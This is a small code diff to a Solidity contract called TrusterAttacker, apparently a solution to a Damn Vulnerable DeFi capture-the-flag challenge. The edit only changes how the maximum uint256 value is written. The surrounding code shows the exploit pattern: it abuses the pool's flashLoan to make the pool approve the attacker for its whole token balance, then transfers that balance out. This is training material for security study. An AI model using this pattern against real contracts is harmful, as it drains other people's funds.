@@ -11,7 +11,7 @@ contract TrusterAttacker {
         address token = address(pool.damnValuableToken());
         
         // Allow this contract to initiate transfer of UINT_MAX
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
         pool.flashLoan(0, msg.sender, token, data);
 
         // Transfer all balance to the function caller
